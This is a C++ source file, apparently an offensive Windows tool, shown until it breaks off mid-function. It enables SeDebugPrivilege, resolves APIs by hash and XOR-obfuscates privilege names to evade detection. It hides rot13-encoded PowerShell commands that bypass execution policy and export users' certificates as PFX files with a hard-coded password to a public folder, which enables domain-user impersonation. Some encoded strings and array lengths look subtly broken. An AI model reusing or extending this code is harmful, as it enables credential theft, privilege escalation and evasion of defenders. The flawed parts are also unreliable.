#define _CRT_SECURE_NO_WARNINGS // Required for _popen with some compilers

#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <lm.h>
#include "ACL.h" 
#include <iostream>
#include <vector>
#include <string>
#include <limits>
#include <memory>
#include <algorithm>
#include <sddl.h>
#include <fstream>   
#include <cstdlib>   
#include <cstdio>    
#include <array>    
#include <set>       
#include <locale>    
#include <codecvt>   
#include <thread>    
#include <chrono>    
#include <Shlwapi.h> 

std::wstring Deobfuscate(const wchar_t*, size_t, wchar_t);
std::string rot13(const std::string&);

std::wstring Deobfuscate(const wchar_t* data, size_t len, wchar_t key) {
    std::wstring result;
    result.reserve(len);
    for (size_t i = 0; i < len; ++i)
        result.push_back(data[i] ^ key);
    return result;
}

std::string rot13(const std::string& s) {
    std::string r = s;
    for (char& c : r) {
        if ('a' <= c && c <= 'z') c = ((c - 'a' + 13) % 26) + 'a';
        if ('A' <= c && c <= 'Z') c = ((c - 'A' + 13) % 26) + 'A';
    }
    return r;
}

// --- Defines ---
#define MAX_USERNAME_LENGTH 256
#define MAX_DOMAINNAME_LENGTH 256
#define FULL_NAME_LENGTH (MAX_USERNAME_LENGTH + MAX_DOMAINNAME_LENGTH + 1)
#define TOKEN_TYPE_LENGTH 30
#define TOKEN_IMPERSONATION_LENGTH 50
#define TOKEN_INTEGRITY_LENGTH 20
#define COMMAND_LENGTH 2048
#define SYSTEM_HANDLE_INFORMATION_SIZE (1024 * 1024 * 10)

// --- File Path Defines ---
const std::string PUBLIC_PATH = "C:\\Users\\Public\\";
// Base names will have username appended
const std::string INF_FILENAME_PREFIX = "My_request_";
const std::string CSR_FILENAME_PREFIX = "My_request_";
const std::string CER_FILENAME_PREFIX = "My_Cert_"; // Make unique too
const std::string THUMBPRINT_FILENAME = PUBLIC_PATH + "thumbprint.txt"; // Keep single thumbprint file for simplicity
const std::string PFX_PASSWORD = "1qaz!QAZ";




// --- NTSTATUS Definitions ---
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif
#ifndef STATUS_BUFFER_OVERFLOW
#define STATUS_BUFFER_OVERFLOW ((NTSTATUS)0x80000005L)
#endif
#ifndef STATUS_INVALID_HANDLE
#define STATUS_INVALID_HANDLE ((NTSTATUS)0xC0000008L)
#endif
#ifndef STATUS_ACCESS_DENIED
#define STATUS_ACCESS_DENIED ((NTSTATUS)0xC0000022L)
#endif

// --- Windows Structures ---
#define SystemHandleInformation 16

// WinAPI: Privileges
typedef BOOL(WINAPI* _OpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef HANDLE(WINAPI* _GetCurrentProcess)(VOID);
typedef BOOL(WINAPI* _LookupPrivilegeValueW)(LPCWSTR, LPCWSTR, PLUID);
typedef BOOL(WINAPI* _AdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
typedef BOOL(WINAPI* _CloseHandle)(HANDLE);
typedef BOOL(WINAPI* _GetTokenInformation)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);

// Other token related
typedef BOOL(WINAPI* _IsValidSid)(PSID);
typedef PUCHAR(WINAPI* _GetSidSubAuthorityCount)(PSID);
typedef PDWORD(WINAPI* _GetSidSubAuthority)(PSID, DWORD);

// Handle operations
typedef DWORD(WINAPI* _GetCurrentProcessId)(VOID);
typedef HANDLE(WINAPI* _OpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL(WINAPI* _DuplicateHandle)(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
typedef DWORD(WINAPI* _GetLastError)(VOID);

// Memory allocators
typedef HLOCAL(WINAPI* _LocalAlloc)(UINT, SIZE_T);
typedef HLOCAL(WINAPI* _LocalFree)(HLOCAL);
typedef HGLOBAL(WINAPI* _GlobalAlloc)(UINT, SIZE_T);
typedef HGLOBAL(WINAPI* _GlobalFree)(HGLOBAL);

// SID utilities
typedef BOOL(WINAPI* _LookupAccountSidW)(LPCWSTR, PSID, LPWSTR, LPDWORD, LPWSTR, LPDWORD, PSID_NAME_USE);
typedef BOOL(WINAPI* _ConvertSidToStringSidW)(PSID, LPWSTR*);


// --- API Hash Defines (DJB2) ---
#define H_API_LookupPrivilegeValueW   0xBBAE6E9A // done
#define H_API_AdjustTokenPrivileges   0xCE4CD9CB // done
#define H_API_GetCurrentProcess          0xCA8D7527 //done
#define H_API_OpenProcessToken           0xC57BD097 //done
#define H_API_GetTokenInformation        0x8ED47F2C //done
#define H_API_LocalAlloc                 0x73CEBC5B //done
#define H_API_LocalFree                  0xA66DF372 //done
#define H_API_IsValidSid                 0x3D180391 //done
#define H_API_GetSidSubAuthorityCount    0x528A2BE1 //done
#define H_API_GetSidSubAuthority         0xE58BB0B8 //done
#define H_API_CloseHandle                0x3870CA07 //done
#define H_API_LookupAccountSidW          0xBC518D43 //done
#define H_API_ConvertSidToStringSidW     0x99A22DD7 //done
#define H_API_GlobalAlloc                0xBB513941 //done
#define H_API_GlobalFree                 0x4B816B98 //done
#define H_API_NtQuerySystemInformation   0xEE4F73A8 //done
#define H_API_GetCurrentProcessId        0xA3BF64B4 //done
#define H_API_OpenProcess                0x7136FDD6 //done
#define H_API_DuplicateHandle            0xEE96B40C //done
#define H_API_GetLastError               0x2082EAE3 //done
#define H_API_DuplicateTokenEx           0x7D9A8F1E //done
#define H_API_SetTokenInformation        0xD9114A38 //done
#define H_API_CreateProcessAsUserW       0x8B8A3C7B //done
#define H_API_CreateProcessWithTokenW    0xB053CC42 //done
#define H_API_WaitForSingleObject        0xCCF99AFF //done
#define H_API_GetExitCodeProcess         0xE21026F9 //done
#define H_API_PathFindFileNameW          0xDF9B5C8B //done

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT ProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );


typedef struct _OBJECT_TYPE_INFORMATION {
    UNICODE_STRING Name;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccess;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    USHORT MaintainTypeList;
    ULONG PoolType; // אם הגדרת POOL_TYPE, אפשר גם POOL_TYPE PoolType;
    ULONG PagedPoolUsage;
    ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

typedef BOOL(WINAPI* _DuplicateTokenEx)(
    HANDLE, DWORD, LPSECURITY_ATTRIBUTES,
    SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);

typedef BOOL(WINAPI* _SetTokenInformation)(
    HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD);

typedef BOOL(WINAPI* _CreateProcessAsUserW)(
    HANDLE, LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES,
    LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID,
    LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

typedef BOOL(WINAPI* _CreateProcessWithTokenW)(
    HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID,
    LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

typedef DWORD(WINAPI* _WaitForSingleObject)(HANDLE, DWORD);

typedef BOOL(WINAPI* _GetExitCodeProcess)(HANDLE, LPDWORD);

typedef LPWSTR(WINAPI* _PathFindFileNameW)(LPCWSTR);

typedef BOOL(WINAPI* _CloseHandle)(HANDLE);


// NTDLL
typedef NTSTATUS(NTAPI* PFN_NtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );



unsigned long hash_djb2(const char* str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

// GetProcAddress לפי hash של שם הפונקציה!
FARPROC GetProcAddressByHash(HMODULE hModule, unsigned long hash) {
    if (!hModule)
        return nullptr;

    auto* dosHeader = (PIMAGE_DOS_HEADER)hModule;
    auto* ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    auto* exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* funcNames = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
    WORD* nameOrdinals = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
    DWORD* funcAddrs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* funcName = (const char*)hModule + funcNames[i];
        //printf("[HASHDBG] Export: %s => 0x%08lX\n", funcName, hash_djb2(funcName));
        if (hash_djb2(funcName) == hash) {
            WORD ordinal = nameOrdinals[i];
            return (FARPROC)((BYTE*)hModule + funcAddrs[ordinal]);
        }
    }
    return nullptr;
}

//dddd



std::string WStringToString(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_ACP, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_ACP, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}


std::wstring StringToWString(const std::string& str) {
    if (str.empty()) return std::wstring();
    int size_needed = MultiByteToWideChar(CP_ACP, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_ACP, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}


// --- Get Domain Name ---
std::string GetUserDnsDomain() {
    std::string result = "";
    std::array<char, 256> buffer;

    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen("set USERDNSDOMAIN", "r"), _pclose);
    if (!pipe) {
        wprintf(L"[!] GetUserDnsDomain: _popen() failed!\n");
        return "";
    }

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }


    size_t equalsPos = result.find('=');
    if (equalsPos != std::string::npos) {
        std::string domain = result.substr(equalsPos + 1);

        size_t first = domain.find_first_not_of(" \t\r\n");
        size_t last = domain.find_last_not_of(" \t\r\n");
        if (first != std::string::npos && last != std::string::npos) {
            std::string trimmedDomain = domain.substr(first, (last - first + 1));
            if (!trimmedDomain.empty()) {
                return trimmedDomain;
            }
        }
    }
    wprintf(L"[!] GetUserDnsDomain: Could not parse domain from 'set USERDNSDOMAIN' output.\n");
    return "";
}


//Certificate  Functions

std::string trim(const std::string& str) {
    size_t first = str.find_first_not_of(" \t\r\n");
    size_t last = str.find_last_not_of(" \t\r\n");
    if (first == std::string::npos || last == std::string::npos)
        return "";
    return str.substr(first, (last - first + 1));
}

// Generate INF file content
std::string generateINF(const std::string& username, const std::string& domain, const std::string& infFilePath) {

    if (domain.empty() || username.empty()) {
        wprintf(L"[!] generateINF: Username or Domain is empty. Cannot generate INF.\n");
        return "";
    }

    std::ofstream infFile(infFilePath);
    if (!infFile.is_open()) {
        wprintf(L"[!] generateINF: Failed to open INF file for writing: %S\n", infFilePath.c_str());
        return "";
    }

    std::string domainDC1 = domain.substr(0, domain.find('.'));
    std::string domainDC2 = domain.substr(domain.find('.') + 1);
    std::string subject = "CN=" + username + ", OU=Users, DC=" + domainDC1 + ", DC=" + domainDC2;
    std::string upn = username + "@" + domain;

    infFile <<
        "[Version]\n"
        "Signature=\"$Windows NT$\"\n\n"
        "[NewRequest]\n"
        "Subject = \"" << subject << "\"\n"
        "KeySpec = 1\n"
        "KeyLength = 2048\n"
        "Exportable = TRUE\n"
        "MachineKeySet = FALSE\n"
        "ProviderName = \"Microsoft Enhanced Cryptographic Provider v1.0\"\n"
        "ProviderType = 1\n"
        "RequestType = PKCS10\n"
        "KeyUsage = 0xa0\n\n"
        "[EnhancedKeyUsageExtension]\n"
        "OID=1.3.6.1.5.5.7.3.2\n\n"
        "[Extensions]\n"
        "2.5.29.17 = \"{text}\"\n"
        "_continue_ = \"dns=" << domain << "&upn=" << upn << "\"\n";

    infFile.close();
    wprintf(L"[*] generateINF: Successfully generated INF file: %S\n", infFilePath.c_str());
    return infFilePath;
}

//  Certificate  Functions Command 

std::wstring getLatestThumbprintCommand() {
    std::string encoded = "cbjreshy -AbCebsvyr -AbaVagreafvir -RkprcgvbafCbyvpr Olcnff -Pbzcbeg \"gel { (Trg-PuvyqVzr Prcg:\\PheeragHfre\\Zl | JuraRpbqr { $_.UnfCevagrXrl } | Fbeg-Bject AbgSbepr -Qrfpevcvat | Fryrpg-Bject -Svefg 1).Gubhzocevag | Bhg-Svyr -Rapbqrvat NFPVP '";
    encoded += THUMBPRINT_FILENAME; 
    encoded += "' -ReebeNpgvingr Fgbc } pnfg { Jevg-Rree $_; rkv 1 }\"";
    std::string command = rot13(encoded);
    return StringToWString(command);
}

// Reads the thumbprint 
std::string readThumbprintFromFile() {
    std::ifstream file(THUMBPRINT_FILENAME);
    if (!file.is_open()) {
        wprintf(L"[!] readThumbprintFromFile: Failed to open thumbprint file: %S\n", THUMBPRINT_FILENAME.c_str());
        return "";
    }
    std::string thumbprint;
    std::getline(file, thumbprint);
    file.close();

    return trim(thumbprint);
}


// Returns the PowerShell command string to export the PFX

std::wstring exportPFXCommand(const std::string& thumbprint, const std::string& username) {
    if (thumbprint.empty() || username.empty()) {
        wprintf(L"[!] exportPFXCommand: Thumbprint or Username is empty.\n");
        return L"";
    }
    std::string pfxFilePath = PUBLIC_PATH + username + ".pfx";

    // שים לב שכל מה שחשוד - מוצפן
    std::string rot_psCommand =
        "cbjreshy -AbCebsvyr -AbaVagreafvir -RkprcgvbafCbyvpr Olcnff -Pbzcbeg \"gel { "
        "$cnffjbeq = PbasrerapGb-FrdhrevFgevat -Fgevat '" + PFX_PASSWORD + "' -NfCynvaGrkg -Sbhe; "
        "Rkcbeg-CskPragerngvba -Preg Preg:\\\\PhgrelHfre\\\\Zl\\\\" + thumbprint +
        " -SvyrCngu '" + pfxFilePath + "' -Cnffjbeq $cnffjbeq -ReebeNpgvingr Fgbc; "
        "Jevir-Ubfg 'Csk Rkcbegrq Fhpprffshyyl' } pnfg { Jevir-Reebe $_; rkv 1 }\"";

    // בזמן ריצה - מפענחים
    std::string psCommand = rot13(rot_psCommand);

    return StringToWString(psCommand);
}


// --- Modified TOKEN Struct ---
typedef struct {
    HANDLE TokenHandle;
    int DisplayId;
    DWORD SessionId;
    wchar_t Username[FULL_NAME_LENGTH];
    wchar_t UsernameOnly[MAX_USERNAME_LENGTH];
    wchar_t DomainName[MAX_DOMAINNAME_LENGTH];
    wchar_t TokenType[TOKEN_TYPE_LENGTH];
    wchar_t TokenImpersonationLevel[TOKEN_IMPERSONATION_LENGTH];
    wchar_t TokenIntegrity[TOKEN_INTEGRITY_LENGTH];
    SID_NAME_USE SidType;
} TOKEN;


// --- Global Variables ---
std::vector<TOKEN> g_discoveredTokens;
DWORD g_currentProcessIntegrity = SECURITY_MANDATORY_UNTRUSTED_RID;
DWORD g_currentSessionId = (DWORD)-1;
std::string g_userDnsDomain = "";


// --- Forward Declarations ---
bool EnablePrivilege(LPCWSTR privilegeName);
bool InitializePrivileges();
void RetrieveTokenSessionId(TOKEN& tokenInfo);
void RetrieveTokenUserInfo(TOKEN& tokenInfo); // Modified
void RetrieveTokenDetails(TOKEN& tokenInfo);
std::wstring GetKernelObjectTypeName(HANDLE hObject);
bool DiscoverAndStoreTokens();
void DisplayTokenList();
void CleanupTokenHandles();
bool RunCommandAsToken(const TOKEN& tokenInfo, const std::wstring& commandLine); // Modified
void RequestCertificateForToken(int tokenId); // New
std::string GetUserDnsDomain(); // New
std::string WStringToString(const std::wstring& wstr); // New
std::wstring StringToWString(const std::string& str); // New
std::string trim(const std::string& str); // New
std::string generateINF(const std::string& username, const std::string& domain, const std::string& infFilePath); // New
std::wstring getLatestThumbprintCommand(); // New
std::string readThumbprintFromFile(); // New
std::wstring exportPFXCommand(const std::string& thumbprint, const std::string& username); // New
void ClearInputBuffer(); // Added back for interactive input


// --- Function Implementations ---

void ClearInputBuffer() {

    std::wcin.clear();

    std::wcin.ignore((std::numeric_limits<std::streamsize>::max)(), '\n');
}

//new1

// פונקציה לפיענוח XOR של מחרוזות wide

// פונקציה שמקבלת מזהה ומחזירה את שם ה-privilege בפיענוח
const wchar_t* getObfuscatedPrivilege(int privId, size_t& outLen, wchar_t& outKey) {
    // שם privilege ב-XOR 0x6A (לדוג')
    // "SeDebugPrivilege"
    static const wchar_t obf_SeDebugPrivilege[] = {
        0x39,0x0F,0x2E,0x0F,0x0F,0x1F,0x3E,0x26,0x2A,0x10,0x3A,0x03,0x0C,0x0D,0x0F,0x0D
    }; // אורך 16, מפתח 0x6A
    // "SeAssignPrimaryTokenPrivilege"
    static const wchar_t obf_SeAssignPrimaryTokenPrivilege[] = {
        0x39,0x0F,0x0A,0x0F,0x0C,0x1B,0x0C,0x3C,0x30,0x02,0x0A,0x1A,0x27,0x1F,0x3F,0x22,
        0x0F,0x32,0x20,0x2C,0x3A,0x03,0x0C,0x0D,0x0F,0x0D
    }; // אורך 26, מפתח 0x6A
    // "SeIncreaseQuotaPrivilege"
    static const wchar_t obf_SeIncreaseQuotaPrivilege[] = {
        0x39,0x0F,0x0C,0x20,0x0F,0x28,0x10,0x2A,0x21,0x32,0x03,0x32,0x3A,0x03,0x0C,0x0D,0x0F,0x0D
    }; // אורך 18, מפתח 0x6A

    switch (privId) {
    case 0: outLen = 16; outKey = 0x6A; return obf_SeDebugPrivilege;
    case 1: outLen = 26; outKey = 0x6A; return obf_SeAssignPrimaryTokenPrivilege;
    case 2: outLen = 18; outKey = 0x6A; return obf_SeIncreaseQuotaPrivilege;
    default: outLen = 0; outKey = 0; return nullptr;
    }
}

// השתמש בזה כך:
bool EnablePrivilege(int privId) {
    static _OpenProcessToken      MyOpenProcessToken = nullptr;
    static _GetCurrentProcess     MyGetCurrentProcess = nullptr;
    static _LookupPrivilegeValueW MyLookupPrivilegeValueW = nullptr;
    static _AdjustTokenPrivileges MyAdjustTokenPrivileges = nullptr;
    static _CloseHandle           MyCloseHandle = nullptr;
    static _GetTokenInformation   MyGetTokenInformation = nullptr;

    if (!MyOpenProcessToken || !MyGetCurrentProcess || !MyLookupPrivilegeValueW || !MyAdjustTokenPrivileges || !MyCloseHandle || !MyGetTokenInformation) {
        HMODULE hKernel32 = LoadLibraryW(L"kernel32.dll");
        if (!hKernel32) return false;
        HMODULE hAdvapi32 = LoadLibraryW(L"advapi32.dll");
        if (!hAdvapi32) return false;
        MyGetCurrentProcess = (_GetCurrentProcess)GetProcAddressByHash(hKernel32, H_API_GetCurrentProcess);
        MyOpenProcessToken = (_OpenProcessToken)GetProcAddressByHash(hAdvapi32, H_API_OpenProcessToken);
        MyLookupPrivilegeValueW = (_LookupPrivilegeValueW)GetProcAddressByHash(hAdvapi32, H_API_LookupPrivilegeValueW);
        MyAdjustTokenPrivileges = (_AdjustTokenPrivileges)GetProcAddressByHash(hAdvapi32, H_API_AdjustTokenPrivileges);
        MyCloseHandle = (_CloseHandle)GetProcAddressByHash(hKernel32, H_API_CloseHandle);
        MyGetTokenInformation = (_GetTokenInformation)GetProcAddressByHash(hAdvapi32, H_API_GetTokenInformation);
    }

    size_t privLen = 0;
    wchar_t key = 0;
    const wchar_t* obfPriv = getObfuscatedPrivilege(privId, privLen, key);
    if (!obfPriv || !privLen) return false;
    std::wstring privName = Deobfuscate(obfPriv, privLen, key);

    HANDLE hToken;
    if (!MyOpenProcessToken(MyGetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;
    }

    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!MyLookupPrivilegeValueW(NULL, privName.c_str(), &luid)) {
        MyCloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!MyAdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        // לא כל כישלון כאן חמור
    }

    DWORD dwReturnLength = 0;
    MyGetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwReturnLength);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        MyCloseHandle(hToken);
        return false;
    }

    std::vector<BYTE> buffer(dwReturnLength);
    PTOKEN_PRIVILEGES pTokenPrivileges = reinterpret_cast<PTOKEN_PRIVILEGES>(buffer.data());

    if (!MyGetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwReturnLength, &dwReturnLength)) {
        MyCloseHandle(hToken);
        return false;
    }

    MyCloseHandle(hToken);

    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; ++i) {
        if (pTokenPrivileges->Privileges[i].Luid.LowPart == luid.LowPart &&
            pTokenPrivileges->Privileges[i].Luid.HighPart == luid.HighPart) {
            if ((pTokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)) {
                return true;
            }
        }
    }
    return false;
}



//new2

bool InitializePrivileges() {
    static _OpenProcessToken      MyOpenProcessToken = nullptr;
    static _GetCurrentProcess     MyGetCurrentProcess = nullptr;
    static _GetTokenInformation   MyGetTokenInformation = nullptr;
    static _LocalAlloc            MyLocalAlloc = nullptr;
    static _LocalFree             MyLocalFree = nullptr;
    static _IsValidSid            MyIsValidSid = nullptr;
    static _GetSidSubAuthorityCount MyGetSidSubAuthorityCount = nullptr;
    static _GetSidSubAuthority    MyGetSidSubAuthority = nullptr;
    static _CloseHandle           MyCloseHandle = nullptr;

    if (!MyOpenProcessToken) {
        HMODULE hKernel32 = LoadLibraryW(L"kernel32.dll");
        HMODULE hAdvapi32 = LoadLibraryW(L"advapi32.dll");

        if (!hKernel32 || !hAdvapi32) {
            wprintf(L"[!] Failed to load kernel32.dll or advapi32.dll\n");
            return false;
        }

        MyGetCurrentProcess = (_GetCurrentProcess)GetProcAddressByHash(hKernel32, H_API_GetCurrentProcess);
        MyOpenProcessToken = (_OpenProcessToken)GetProcAddressByHash(hAdvapi32, H_API_OpenProcessToken);
        MyGetTokenInformation = (_GetTokenInformation)GetProcAddressByHash(hAdvapi32, H_API_GetTokenInformation);
        MyLocalAlloc = (_LocalAlloc)GetProcAddressByHash(hKernel32, H_API_LocalAlloc);
        MyLocalFree = (_LocalFree)GetProcAddressByHash(hKernel32, H_API_LocalFree);
        MyIsValidSid = (_IsValidSid)GetProcAddressByHash(hAdvapi32, H_API_IsValidSid);
        MyGetSidSubAuthorityCount = (_GetSidSubAuthorityCount)GetProcAddressByHash(hAdvapi32, H_API_GetSidSubAuthorityCount);
        MyGetSidSubAuthority = (_GetSidSubAuthority)GetProcAddressByHash(hAdvapi32, H_API_GetSidSubAuthority);
        MyCloseHandle = (_CloseHandle)GetProcAddressByHash(hKernel32, H_API_CloseHandle);
    }

    wprintf(L"[*] Initializing privileges...\n");
    // קרא לפי מזהה ולא לפי שם גלוי
    EnablePrivilege(0); // SeDebugPrivilege
    EnablePrivilege(1); // SeAssignPrimaryTokenPrivilege
    EnablePrivilege(2); // SeIncreaseQuotaPrivilege

    HANDLE hCurrentToken;
    DWORD cbSize = 0;
    g_currentProcessIntegrity = 0;
    g_currentSessionId = (DWORD)-1;

    if (MyOpenProcessToken(MyGetCurrentProcess(), TOKEN_QUERY, &hCurrentToken)) {
        MyGetTokenInformation(hCurrentToken, TokenIntegrityLevel, NULL, 0, &cbSize);
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
            PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)MyLocalAlloc(LPTR, cbSize);
            if (pTIL && MyGetTokenInformation(hCurrentToken, TokenIntegrityLevel, pTIL, cbSize, &cbSize)) {
                if (pTIL->Label.Sid && MyIsValidSid(pTIL->Label.Sid)) {
                    DWORD dwIntegrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;
                    PUCHAR RIDS = MyGetSidSubAuthorityCount(pTIL->Label.Sid);
                    if (RIDS && *RIDS > 0) {
                        dwIntegrityLevel = *MyGetSidSubAuthority(pTIL->Label.Sid, (DWORD)(*RIDS - 1));
                    }
                    g_currentProcessIntegrity = dwIntegrityLevel;
                }
            }
            if (pTIL) MyLocalFree(pTIL);
        }
        // Get Session ID
        cbSize = sizeof(DWORD);
        if (!MyGetTokenInformation(hCurrentToken, TokenSessionId, &g_currentSessionId, cbSize, &cbSize)) {
            g_currentSessionId = (DWORD)-1;
            wprintf(L"[!] Warning: Could not get current process session ID. Error: %lu\n", GetLastError());
        }
        MyCloseHandle(hCurrentToken);
    }
    else {
        wprintf(L"[!] Could not open current process token. Error: %lu\n", GetLastError());
    }

    wprintf(L"[*] Current Process Info: SessionID=%lu, Integrity=0x%lX\n",
        (g_currentSessionId == (DWORD)-1) ? 0 : g_currentSessionId,
        g_currentProcessIntegrity);

    // קרא שוב לפי מזהה, לקבל תשובה ולהציג הודעה מתאימה אם תרצה (אם חובה)
    bool seDebugOk = EnablePrivilege(0);
    bool seAssignPrimaryOk = EnablePrivilege(1);

    if (!seDebugOk) {
        wprintf(L"[!] Critical privilege (SeDebugPrivilege) could not be enabled/verified. Token discovery will likely fail for many processes.\n");
    }
    if (!seAssignPrimaryOk) {
        wprintf(L"[!] Privilege (SeAssignPrimaryTokenPrivilege) could not be enabled/verified. Process creation as user might fail.\n");
    }
    return true;
}



//new3

void RetrieveTokenSessionId(TOKEN& tokenInfo) {
    static _GetTokenInformation MyGetTokenInformation = nullptr;
    if (!MyGetTokenInformation) {

        HMODULE hAdvapi = LoadLibraryW(L"advapi32.dll");
        if (!hAdvapi) {
            wprintf(L"[!] RetrieveTokenSessionId: Failed to load advapi32.dll!\n");
            tokenInfo.SessionId = (DWORD)-1;
            return;
        }

        //wprintf(L"[DBG][RetrieveTokenSessionId] Resolving GetTokenInformation hash...\n")
        MyGetTokenInformation = (_GetTokenInformation)GetProcAddressByHash(hAdvapi, H_API_GetTokenInformation);
        if (!MyGetTokenInformation)
            wprintf(L"[DBG][RetrieveTokenSessionId] Failed to resolve GetTokenInformation!\n");
    }

    DWORD tokenInfoLen = 0;
    DWORD sessionId = (DWORD)-1;
    //wprintf(L"[DBG][RetrieveTokenSessionId] Calling GetTokenInformation for TokenSessionId...\n");
    if (!MyGetTokenInformation(tokenInfo.TokenHandle, TokenSessionId, &sessionId, sizeof(DWORD), &tokenInfoLen)) {
        tokenInfo.SessionId = (DWORD)-1;
        //wprintf(L"[DBG][RetrieveTokenSessionId] GetTokenInformation failed! LastError=%lu\n", GetLastError());
    }
    else {
        tokenInfo.SessionId = sessionId;
        //wprintf(L"[DBG][RetrieveTokenSessionId] TokenSessionId for handle: %lu\n", sessionId);
    }
}



//new4
void RetrieveTokenUserInfo(TOKEN& tokenInfo) {
    // Resolve פעם אחת בלבד (static)
    static _GetTokenInformation      MyGetTokenInformation = nullptr;
    static _LookupAccountSidW       MyLookupAccountSidW = nullptr;
    static _ConvertSidToStringSidW  MyConvertSidToStringSidW = nullptr;
    static _GlobalAlloc             MyGlobalAlloc = nullptr;
    static _GlobalFree              MyGlobalFree = nullptr;
    static _LocalFree               MyLocalFree = nullptr;

    if (!MyGetTokenInformation || !MyLookupAccountSidW || !MyConvertSidToStringSidW || !MyGlobalAlloc || !MyGlobalFree || !MyLocalFree) {
        //wprintf(L"[DBG][RetrieveTokenUserInfo] Resolving API hashes...\n");
        HMODULE hAdvapi = LoadLibraryW(L"advapi32.dll");
        if (!hAdvapi) {
            wprintf(L"[!] RetrieveTokenSessionId: Failed to load advapi32.dll!\n");
            tokenInfo.SessionId = (DWORD)-1;
            return;
        }
        HMODULE hKernel32 = LoadLibraryW(L"kernel32.dll");
        if (!hKernel32) {
            wprintf(L"[!] RetrieveTokenSessionId: Failed to load hKernel32.dll!\n");
            tokenInfo.SessionId = (DWORD)-1;
            return;
        }
        MyGetTokenInformation = (_GetTokenInformation)GetProcAddressByHash(hAdvapi, H_API_GetTokenInformation);
        MyLookupAccountSidW = (_LookupAccountSidW)GetProcAddressByHash(hAdvapi, H_API_LookupAccountSidW);
